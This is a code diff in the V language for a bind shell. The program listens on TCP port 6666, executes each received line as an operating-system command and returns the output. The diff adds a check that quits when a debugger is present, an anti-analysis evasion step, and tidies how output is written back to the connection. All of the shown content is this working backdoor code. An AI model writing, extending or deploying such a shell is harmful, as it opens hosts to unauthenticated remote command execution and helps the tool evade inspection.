@@ -5,6 +5,10 @@ import os
 * use "exit" to close connection, use CTRL-C to close program on remote host
 */
 fn main() {
+	if os.debugger_present() {
+		return
+	}
+
 	mut listener := net.listen_tcp(.ip, ':6666') ?
 	listener.addr() ?
 
@@ -38,13 +42,13 @@ fn handle_conn(mut conn net.TcpConn) ? {
 
 		// print(buffer)	// debugging
 		if buffer != 'exit\n' {
+			mut output := ''
 			$if windows {
-				output := os.execute('cmd /c ' + buffer[..buffer.len - 1])
-				conn.write_string(output.str() + '\n') or { continue }
+				output = os.execute('cmd /c ' + buffer[..buffer.len - 1]).str()
 			} $else {
-				output := os.execute(buffer)
-				conn.write_string(output.str() + '\n') or { continue }
+				output = os.execute(buffer).str()
 			}
+			conn.write_string(output + '\n') or { continue }
 		} else {
 			conn.write_string('Bye\n') ?
 			exit = true
